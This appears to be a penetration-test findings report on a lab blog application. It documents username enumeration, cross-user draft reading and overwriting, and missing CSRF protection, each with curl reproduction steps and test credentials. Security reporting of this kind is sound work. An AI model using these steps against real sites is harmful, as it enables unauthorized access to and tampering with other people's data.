title: Username enumeration on registration
description: The registration workflow returns a distinct response when a submitted username already exists. This allows an attacker to determine whether an account name is valid by comparing registration responses on POST /register.
steps:
1. Submit a registration request using a known existing username: curl -i -sS -X POST 'http://blog:5003/register' -d 'username=ptest31pjl4&password=TmpPassw0rd!1&confirm_password=TmpPassw0rd!1&submit=Sign+Up'
2. Observe HTTP 200 OK and the message: 'Username already exists. Please choose a different one.'
3. Submit a contrasting request with a nonexistent username and another validation error: curl -i -sS -X POST 'http://blog:5003/register' -d 'username=nouserx1y2z&password=TmpPassw0rd!1&confirm_password=TmpPassw0rd!2&submit=Sign+Up'
4. Observe HTTP 200 OK but the duplicate-username message is absent.

title: Cross-user draft listing disclosure via GET /<username>/drafts
description: The application exposes username-scoped draft listings but does not verify that the authenticated user is authorized to view the requested username’s drafts. Any logged-in user can request another user’s listing page and obtain draft titles and edit links.
steps:
1. Log in as Account A: curl -i -sS -c A.cookies -X POST 'http://blog:5003/login' -d 'username=ptest31pjl4&password=Passw0rd!pndZ&submit=Login'
2. Request Account B’s drafts using Account A’s session: curl -i -sS -b A.cookies 'http://blog:5003/ptestb2k4r/drafts'
3. Observe HTTP 200 OK and a page titled for Account B’s drafts that discloses draft titles and edit links such as /edit_draft/4 and /edit_draft/5.
4. Repeat in the opposite direction if desired: curl -i -sS -b B.cookies 'http://blog:5003/ptest31pjl4/drafts'.

title: Cross-user draft read via GET /edit_draft/<id>
description: The draft edit endpoint returns full draft data for any valid numeric draft ID without enforcing ownership. Any authenticated user can retrieve another user’s draft title and content if the ID is known or discoverable.
steps:
1. Log in as Account B: curl -i -sS -c B.cookies -X POST 'http://blog:5003/login' -d 'username=ptestb2k4r&password=Passw0rd!b2k4r&submit=Login'
2. Request Account A’s draft directly by ID: curl -i -sS -b B.cookies 'http://blog:5003/edit_draft/2'
3. Observe HTTP 200 OK and the full Account A draft title/content rendered in the edit form.
4. The same issue is reproducible from Account A to Account B using IDs 4 or 5.

title: Cross-user draft modification via POST /edit_draft/<id>
description: The draft update endpoint accepts modifications for any valid draft ID without verifying ownership. Any authenticated user can overwrite another user’s draft title and content.
steps:
1. Log in as Account A and Account B in separate sessions: curl -i -sS -c A.cookies -X POST 'http://blog:5003/login' -d 'username=ptest31pjl4&password=Passw0rd!pndZ&submit=Login' ; curl -i -sS -c B.cookies -X POST 'http://blog:5003/login' -d 'username=ptestb2k4r&password=Passw0rd!b2k4r&submit=Login'
2. As Account A, overwrite Account B’s draft 4: curl -i -sS -b A.cookies -X POST 'http://blog:5003/edit_draft/4' --data-urlencode 'title=B-BENIGN-TITLE-8d2e4b|XUSER-A-EDIT-4' --data-urlencode 'content=B-BENIGN-CONTENT-8d2e4b|XUSER-A-EDIT-4' --data-urlencode 'submit=Save Draft'
3. Observe a successful HTTP 302 redirect.
4. Verify as Account B: curl -i -sS -b B.cookies 'http://blog:5003/edit_draft/4'
5. Observe HTTP 200 OK and the modified title/content, confirming unauthorized persistent write access.

title: CSRF on POST /create_draft
description: The draft creation form does not include an anti-CSRF token, and the endpoint accepts a normal form-style POST using only the authenticated session cookie. This allows a victim browser to be induced to create attacker-controlled drafts.
steps:
1. Log in as Account A: curl -i -sS -c A.cookies -X POST 'http://blog:5003/login' -d 'username=ptest31pjl4&password=Passw0rd!pndZ&submit=Login'
2. Request the form and note there is no anti-CSRF token present: curl -i -sS -b A.cookies 'http://blog:5003/create_draft'
3. Submit a standard form POST using only the ambient session cookie: curl -i -sS -b A.cookies -X POST 'http://blog:5003/create_draft' --data-urlencode 'title=CSRFCREATE-A-01' --data-urlencode 'content=CSRFCREATE-A-01' --data-urlencode 'submit=Save Draft'
4. Observe HTTP 302 redirect to /ptest31pjl4/drafts.
5. Verify the new draft appears: curl -i -sS -b A.cookies 'http://blog:5003/ptest31pjl4/drafts'.

title: CSRF on POST /edit_draft/<id>
description: The draft edit form does not include an anti-CSRF token, and the update endpoint accepts a standard form-style POST with only the victim’s authenticated session. This permits unauthorized draft changes from a third-party origin.
steps:
1. Log in as Account A: curl -i -sS -c A.cookies -X POST 'http://blog:5003/login' -d 'username=ptest31pjl4&password=Passw0rd!pndZ&submit=Login'
2. Request the edit form and note there is no anti-CSRF token present: curl -i -sS -b A.cookies 'http://blog:5003/edit_draft/2'
3. Submit a normal form POST using only the authenticated cookie: curl -i -sS -b A.cookies -X POST 'http://blog:5003/edit_draft/2' --data-urlencode 'title=CSRF-EDIT-A-2' --data-urlencode 'content=CSRF-EDIT-A-2' --data-urlencode 'submit=Save Draft'
4. Observe a successful HTTP 302 redirect.
5. Reload the draft: curl -i -sS -b A.cookies 'http://blog:5003/edit_draft/2'
6. Observe the updated values persisted.

title: Logout CSRF on GET /logout
description: Logout is implemented as a state-changing GET request. Because it requires no anti-CSRF protection and can be triggered by a simple cross-site request, a third party can forcibly log out authenticated users.
steps:
1. Log in as Account A: curl -i -sS -c A.cookies -X POST 'http://blog:5003/login' -d 'username=ptest31pjl4&password=Passw0rd!pndZ&submit=Login'
2. Trigger logout using the authenticated session: curl -i -sS -b A.cookies 'http://blog:5003/logout'
3. Observe HTTP 302 redirect to /.
4. Observe the response clears the session cookie: Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/
